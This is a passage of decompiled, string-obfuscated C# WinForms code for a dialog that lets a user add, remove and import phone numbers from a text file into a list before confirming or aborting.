		this.TableLayoutPanel1.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void numslist_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (numslist.SelectedItems.Count > 0)
		{
			remnum.Enabled = true;
		}
		else
		{
			remnum.Enabled = false;
		}
	}

	private void addnum_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(phonetext.Text) | string.IsNullOrWhiteSpace(phonetext.Text))
		{
			BTAlerter.infos(EXGuarder._16753434);
		}
		else
		{
			numslist.Items.Add(phonetext.Text);
		}
	}

	private void remnum_Click(object sender, EventArgs e)
	{
		if (numslist.Items.Count == 0)
		{
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(numslist.SelectedItem, null, EXGuarder._145E7569, new object[0], null, null, null), 0, TextCompare: false))
		{
			BTAlerter.infos(EXGuarder._3C557804);
		}
		else
		{
			object CounterResult = default(object);
			object LoopForResult = default(object);
			if (!ObjectFlowControl.ForLoopControl.ForLoopInitObj(CounterResult, 0, Operators.SubtractObject(NewLateBinding.LateGet(numslist.SelectedItem, null, EXGuarder._145E7569, new object[0], null, null, null), 1), 1, ref LoopForResult, ref CounterResult))
			{
				return;
			}
			do
			{
				try
				{
					numslist.Items.Remove(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(numslist.SelectedItem, new object[1] { CounterResult }, null)));
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
			while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = EXGuarder._5F251E48;
		openFileDialog.Title = EXGuarder._523D1575;
		openFileDialog.Filter = EXGuarder._3C671C25;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		checked
		{
			try
			{
				string fileName = openFileDialog.FileName;
				if (string.IsNullOrEmpty(fileName) || string.IsNullOrWhiteSpace(fileName))
				{
					return;
				}
				string[] array = File.ReadAllLines(fileName);
				if (array.Length <= 0)
				{
					return;
				}
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					string text = array[i].Replace(EXGuarder._5A2F6543, EXGuarder._032E4705);
					if (Versioned.IsNumeric(text))
					{
						numslist.Items.Add(text);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.Abort;
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (numslist.Items.Count == 0)
		{
			MyMsg.Show(EXGuarder._0F65196A, EXGuarder._672A1C71, MyMsg.msgtype.warning, use_no: false, showskip: false, EXGuarder._3A572006);
			return;
		}
		base.DialogResult = DialogResult.OK;
		Close();
	}
}
